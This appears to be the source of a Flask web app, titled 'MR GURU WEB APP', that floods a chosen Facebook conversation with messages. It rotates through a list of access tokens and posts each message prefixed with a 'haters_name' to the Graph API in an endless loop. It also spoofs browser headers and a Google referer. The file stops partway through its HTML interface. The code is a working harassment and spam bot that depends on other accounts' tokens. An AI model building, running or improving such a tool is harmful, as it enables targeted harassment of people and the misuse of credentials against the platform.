import requests
import threading
import time
import os
from flask import Flask, render_template_string, request, redirect, jsonify

app = Flask(__name__)
data = {"status": "OFFLINE", "logs": [], "total_sent": 0}

def send_messages_logic(tokens, convo_id, messages, haters_name, speed):
    global data
    data["status"] = "RUNNING"
    data["total_sent"] = 0
    num_tokens = len(tokens)
    num_messages = len(messages)
    max_tokens = min(num_tokens, num_messages)

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    while data["status"] == "RUNNING":
        try:
            for message_index in range(num_messages):
                if data["status"] != "RUNNING":
                    break
                
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()

                clean_id = convo_id.replace('t_', '').strip()
                url = "https://graph.facebook.com/v15.0/t_{}/".format(clean_id)
                
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

                if response.ok:
                    data["total_sent"] += 1
                    data["logs"].insert(0, f"<span style='color: #0f0;'>[+] Sent: {data['total_sent']} | Time: {current_time}</span>")
                else:
                    data["logs"].insert(0, f"<span style='color: #f00;'>[x] Failed: {message_index + 1} | Error: {response.text}</span>")
                
                time.sleep(int(speed))
            
            if data["status"] == "RUNNING":
                data["logs"].insert(0, "[!] Cycle Complete. Restarting...")
        except Exception as e:
            data["logs"].insert(0, f"[!] System Error: {str(e)}")
            time.sleep(5)

HTML_UI = '''
<!DOCTYPE html>
<html>
<head>
    <title>MR GURU WEB APP</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; }
        .box { border: 2px solid #0f0; border-radius: 15px; padding: 20px; max-width: 450px; margin: 20px auto; box-shadow: 0 0 15px #0f0; }
        textarea, input { width: 90%; background: #111; color: #0f0; border: 1px solid #0f0; margin: 5px; padding: 10px; border-radius: 5px; outline: none; }
        button { width: 95%; padding: 15px; background: #0f0; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 10px; box-shadow: 0 0 10px #0f0; margin-top: 10px; }
        .stop-btn { background: #f00; color: #fff; box-shadow: 0 0 10px #f00; }
        #logs { height: 250px; overflow-y: auto; background: #050505; text-align: left; padding: 10px; margin-top: 15px; font-size: 12px; border: 1px solid #333; }
    </style>
</head>
<body>
